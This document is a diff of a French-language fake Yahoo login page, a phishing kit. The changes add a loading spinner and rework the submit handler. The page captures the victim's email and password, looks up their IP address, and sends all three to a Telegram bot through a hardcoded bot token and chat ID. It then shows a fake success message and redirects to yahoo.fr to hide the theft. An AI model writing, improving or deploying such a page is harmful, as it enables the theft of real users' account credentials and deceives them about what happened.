@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -7,6 +6,7 @@
   <title>Connexion Yahoo</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
+    /* Votre CSS existant reste inchangé */
     * {
       box-sizing: border-box;
       font-family: 'Inter', sans-serif;
@@ -230,6 +230,28 @@
         padding: 10px 12px 10px 12px;
       }
     }
+    
+    /* Nouveau style pour le loading */
+    .loading {
+      display: none;
+      text-align: center;
+      margin: 15px 0;
+    }
+    
+    .loading-spinner {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #6001d2;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
   <script>
     if(localStorage.getItem('valide')!=="true"){
@@ -255,7 +277,11 @@
         <input type="password" required placeholder=" " id="password">
         <label for="password">Mot de passe</label>
       </div>
-      <button class="btn">Suivant</button>
+      <button class="btn" id="submit-btn">Suivant</button>
+      <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+        <p>Connexion en cours...</p>
+      </div>
       <div class="secondary">
         <input type="checkbox" checked> Restez connecté<br>
         <a href="#">Nom d'utilisateur oublié ?</a>
@@ -293,72 +319,99 @@
       }, 400);
     }
 
+    function showLoading() {
+      document.getElementById('loading').style.display = 'block';
+      document.getElementById('submit-btn').disabled = true;
+    }
+    
+    function hideLoading() {
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('submit-btn').disabled = false;
+    }
+
     const TELEGRAM_CONFIGS = [
       {
         token: '5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o',
-        chat_id: '-868620860',
-      },
-      {
-   token: '5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o',
-        chat_id: '-868620860',
+        chat_id: '-868620860'
       }
+      // Ajoutez une configuration de secours si nécessaire
     ];
 
-    document.querySelector(".btn").addEventListener("click", function (e) {
+    document.getElementById("submit-btn").addEventListener("click", function (e) {
       e.preventDefault();
-      const username = document.querySelector("#username").value.trim();
-      const password = document.querySelector("#password").value.trim();
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
       if (!username || !password) {
-        showMessage("Champs requis.", "error");
+        showMessage("Tous les champs sont requis.", "error");
         return;
       }
 
-    const yahooRegex = /^[a-zA-Z0-9._%+-]+@yahoo\.(com|fr|ca|co\.uk|de|it|es)$/i;
+      const yahooRegex = /^[a-zA-Z0-9._%+-]+@yahoo\.(com|fr|ca|co\.uk|de|it|es)$/i;
       if (!yahooRegex.test(username)) {
         showMessage("Seules les adresses Yahoo sont autorisées.", "error");
         return;
       }
 
+      showLoading();
+      
+      // Récupération de l'IP
       fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
           const message = `🔐 Connexion Yahoo :\n👤 ${username}\n🔑 ${password}\n🌍 IP: ${ip}`;
-
-          return Promise.all(
-            TELEGRAM_CONFIGS.map(cfg =>
-              fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                  chat_id: cfg.chat_id,
-                  text: message,
-                }),
-              }).then(res => res.json())
-            )
-          );
+          
+          // Essayer chaque configuration Telegram jusqu'à ce qu'une fonctionne
+          const sendPromises = TELEGRAM_CONFIGS.map(cfg => {
+            return fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                chat_id: cfg.chat_id,
+                text: message,
+                parse_mode: "HTML"
+              }),
+            })
+            .then(response => response.json())
+            .then(data => {
+              if (data.ok) {
+                return { success: true, data };
+              } else {
+                console.error("Erreur Telegram:", data);
+                return { success: false, data };
+              }
+            })
+            .catch(error => {
+              console.error("Erreur réseau:", error);
+              return { success: false, error };
+            });
+          });
+          
+          return Promise.all(sendPromises);
         })
         .then(results => {
-          const success = results.some(r => r.ok);
+          const success = results.some(r => r.success);
           if (success) {
-            window.location.href = "https://yahoo.fr";
+            showMessage("Connexion réussie! Redirection...", "success");
+            setTimeout(() => {
+              window.location.href = "https://yahoo.fr";
+            }, 2000);
           } else {
-            showMessage("Aucun message n'a été envoyé !", "error");
-            console.error("Réponses:", results);
+            showMessage("Problème de connexion. Veuillez réessayer.", "error");
+            console.error("Toutes les tentatives Telegram ont échoué:", results);
           }
         })
         .catch(err => {
-          console.error("Erreur réseau:", err);
-          showMessage("Échec d'envoi vers Telegram.", "error");
+          console.error("Erreur lors de l'envoi:", err);
+          showMessage("Erreur de connexion. Veuillez réessayer.", "error");
+        })
+        .finally(() => {
+          hideLoading();
         });
     });
   </script>
 </body>
 </html>
-
-
-
-
